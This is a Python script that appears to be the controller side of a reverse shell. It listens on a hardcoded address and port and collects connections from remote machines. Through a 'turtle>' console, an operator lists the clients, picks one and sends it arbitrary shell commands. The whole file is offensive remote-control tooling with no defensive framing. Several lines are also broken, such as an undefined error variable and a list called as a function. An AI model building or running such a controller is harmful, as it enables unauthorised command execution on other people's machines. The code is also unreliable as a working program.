import socket
import sys
import threading
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_address = []

def create_socket():
	try:
		global host
		global port
		global s
		host = "192.168.1.62"
		port = 9999
		s = socket.socket()
	except socket.error as msg:
		print("Socket creation error: "+str(msg))
	
	
def bind_socket():
	try:
		global host
		global port
		global s

		print("Binding the port "+ str(port))

		s.bind((host,port))
		s.listen(5)
	except Exception as e:
		print("Socket binding error: "+str(msg)+"\n"+"Trying again...")
		bind_socket()

def socket_accept():
	conn,address = s.accept()
	print("Connection has been established ! "+"IP "+address[0]+"! Port "+str(address[1]))
	send_commands(conn)
	conn.close()

def send_commands(conn):
	while True:
		cmd = input()
		if cmd == 'sair':
			conn.close()
			s.close()
			sys.exit()
		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024),"utf-8")
			print(client_response+cmd)


def acception_connection():
	for c in all_connections:
		c.close()

	del all_connections[:]
	del all_address[:]

	while True:
		try:
			conn, address = s.accept()
			s.setblocking(1)

			all_connections.append(conn)
			all_address.append(address)

			print("Connection has been established : "+address[0])
		except:
			print("Error accepting connections")


def start_turtle():
	while True:
		cmd = input("turtle> ")
		if cmd == 'list':
			list_connections()
		elif 'select' in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_target_commands(conn)
		else:
			print("Command not recognized")


def list_connections():
	results = ''

	selectId = 0
	for i,conn in enumerate(all_connections):
		try:
			conn.send(str.encode(' '))
			conn.recv(201480)
		except:
			del all_connections[i]
			del all_address[i]
			continue

		results = str(i)+" "+str(all_address[i][0])+" "+str(all_address[i][1])+"\n"
		print("--------Clients--------"+"\n"+results)

def get_target(cmd):
	try:
		target = cmd.replace('select','')
		target = int(target)
		conn = all_connections(target)
		print("You care now connected to: "+str(all_address[target][0]))
		print(str(all_address[target][0])+"> "+cmd)
		return conn
	except:
		print("Selection non valid")
		return None

def send_target_commands(conn):
	while True:
		try:
			cmd = input()
			if cmd == 'break':
				break
			if len(str.encode(cmd)) > 0:
				conn.send(str.encode(cmd))
				client_response = str(conn.recv(1024),"utf-8")
				print(client_response+cmd)
		except:
			print("Error sending connections")
			break


def create_workers():
	for _ in range(NUMBER_OF_THREADS):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()


def work():
	while True:
		x = queue.get()
		if x == 1:
			create_socket()
			bind_socket()
			acception_connection()
		if x == 2:
			start_turtle()

		queue.task_done()


def create_jobs():
	for x in JOB_NUMBER:
		queue.put(x)

	queue.join()

create_workers()
create_jobs()